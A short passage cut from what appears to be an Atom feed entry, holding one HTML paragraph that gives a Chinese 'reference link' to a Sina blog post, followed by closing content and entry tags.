-<p>参考链接<a href="http://blog.sina.com.cn/s/blog_5feacbdf01019qzb.html">http://blog.sina.com.cn/s/blog_5feacbdf01019qzb.html</a></p>
 ]]></content>
   </entry>
   
